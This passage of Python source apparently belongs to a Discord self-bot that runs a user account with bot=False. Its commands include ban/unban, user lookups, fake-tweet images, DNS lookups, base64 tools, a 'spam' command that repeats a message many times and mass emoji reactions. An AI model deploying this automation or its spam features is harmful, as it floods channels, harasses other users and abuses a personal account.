    embed.set_footer(text=f"Requested by {ctx.author}")

    embed.add_field(name="ID:", value=member.id)
    embed.add_field(name="Display Name:", value=member.display_name)

    embed.add_field(name="Created Account On:", value=member.created_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"))
    embed.add_field(name="Joined Server On:", value=member.joined_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"))

    embed.add_field(name="Roles:", value="".join([role.mention for role in roles]))
    embed.add_field(name="Highest Role:", value=member.top_role.mention)
    await ctx.send(embed=embed,delete_after=10)


@client.command(name='unban')
async def _unban(ctx, id: int):
    user = await client.fetch_user(id)
    await ctx.guild.unban(user)
    embed=discord.Embed(title=f"Unbanned {id}!", color=0xbf00ff)
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def ban(ctx, member : discord.Member, *, reason = None):
    await ctx.message.delete()
    await member.ban(reason = reason)
    embed=discord.Embed(title=f"Banned {member}", color=0xbf00ff)
    await ctx.send(embed=embed,delete_after=10)

@client.command()
async def tweet(ctx, username: str, *, message: str):
    await ctx.message.delete()
    async with aiohttp.ClientSession() as cs:
        async with cs.get(f"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}") as r:
            res = await r.json()
            em = discord.Embed()
            em.color=0xbf00ff
            em.set_image(url=res["message"])
            await ctx.send(embed=em)



@client.command()
async def covid(ctx):
    await ctx.message.delete()
    r = requests.get("https://api.covid19api.com/world/total")
    res = r.json()
    totalc = 'TotalConfirmed'
    totald = 'TotalDeaths'
    totalr = 'TotalRecovered'
    embed = discord.Embed(title=f' Updated Just Now ', color=0xbf00ff) 
    embed.add_field(name="Deaths", value=f"**{res[totald]}**", inline=True)
    embed.add_field(name="Confirmed", value=f"**{res[totalc]}**", inline=True)
    embed.add_field(name="Recovered", value=f"**{res[totalr]}**", inline=True)
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def d(ctx, limit: int=None): #CLEARS ALL MESSAGES
    await ctx.message.delete()
    passed = 0
    failed = 0
    async for msg in ctx.message.channel.history(limit=limit):
        if msg.author.id == client.user.id:
            try:
                await msg.delete()
                passed += 1
            except:
                failed += 1

@client.command()
async def spam(ctx, amount: int, *, message):
    await ctx.message.delete()    
    for _i in range(amount):
        await ctx.send(message)

@client.command()
async def mr(ctx, amount: int, *, emote):
    await ctx.message.delete() 
    messages = await ctx.message.channel.history(limit=amount).flatten()
    for message in messages:
        await message.add_reaction(emote) 

@client.command()
async def cleardms(ctx):
    await ctx.message.delete()
    for channel in client.private_channels:
                if isinstance(channel, discord.DMChannel):
                    async for msg in channel.history(limit=9999):
                        try:
                            if msg.author == client.user:
                                await msg.delete()
                                
                        except:
                             pass   

@client.command()
async def host2ip(ctx, *, host: str):
    await ctx.message.delete()
    ip = socket.gethostbyname(host)
    embed=discord.Embed(title="IP Found!",color=0xbf00ff)
    embed.add_field(name="IP", value=f"{ip}\n", inline=True)
    embed.add_field(name="Host", value=f"{host}", inline=True)
    await ctx.send(embed=embed,delete_after=10)

                                
@client.command()
async def log(ctx):
    await ctx.message.delete()

@client.command()
async def b64decode(ctx, message):
    await ctx.message.delete()
    base64_message = f'{message}'
    base64_bytes = base64_message.encode('ascii')
    message_bytes = base64.b64decode(base64_bytes)
    decodee = message_bytes.decode('ascii')
    embed=discord.Embed(title=f"Decode for {message}!",description=f"{decodee}",color=0xbf00ff)
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def b64encode(ctx, *, message):
    await ctx.message.delete()
    message = f"{message}"
    message_bytes = message.encode('ascii')
    base64_bytes = base64.b64encode(message_bytes)
    base64_message = base64_bytes.decode('ascii')   
    embed=discord.Embed(title=f"Encoded!",description=f"{base64_message}",color=0xbf00ff)
    await ctx.send(embed=embed,delete_after=10)


@client.command()
async def gethost(ctx, *, ip: str):
    await ctx.message.delete()
    host = socket.gethostbyaddr(ip)
    embed=discord.Embed(title="Host Found",color=0xbf00ff)
    embed.add_field(name="Host", value=f"{host}", inline=True)
    embed.add_field(name="IP", value=f"{ip}\n", inline=True)
    await ctx.send(embed=embed,delete_after=10)

@client.event
async def on_command_error(ctx, error):
    error_str = str(error)
    error = getattr(error, 'original', error)
    if isinstance(error, commands.CommandNotFound):
        return
    elif isinstance(error, commands.CheckFailure):
        print(f"{Fore.WHITE}[{Fore.MAGENTA}!{Fore.WHITE}] {Fore.MAGENTA}You do not have the corrent permissions" + Fore.RESET)
    elif isinstance(error, commands.MissingRequiredArgument):
        print(f"{Fore.WHITE}[{Fore.MAGENTA}!{Fore.WHITE}] {Fore.MAGENTA}Missing arguments: {error}" + Fore.RESET)
    elif isinstance(error, numpy.AxisError):
        print(f"{Fore.WHITE}[{Fore.MAGENTA}!{Fore.WHITE}] {Fore.MAGENTA}invalid image" + Fore.RESET)
    elif isinstance(error, discord.errors.Forbidden):
        print(f"{Fore.WHITE}[{Fore.MAGENTA}!{Fore.WHITE}] {Fore.MAGENTA}Discord error: {error}" + Fore.RESET)
    elif "Cannot send an empty message" in error_str:
        print(f"{Fore.WHITE}[{Fore.MAGENTA}!{Fore.WHITE}] {Fore.MAGENTA}Cant send empty message" + Fore.RESET)
    else:
        print(f"{Fore.WHITE}[{Fore.MAGENTA}!{Fore.WHITE}] {Fore.MAGENTA}{error_str}" + Fore.RESET)


@client.command()
async def watching(ctx, *, message):
    await ctx.message.delete()
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f"{message}"))


client.run(asyncio.get_event_loop().run_until_complete(getToken()), bot=False)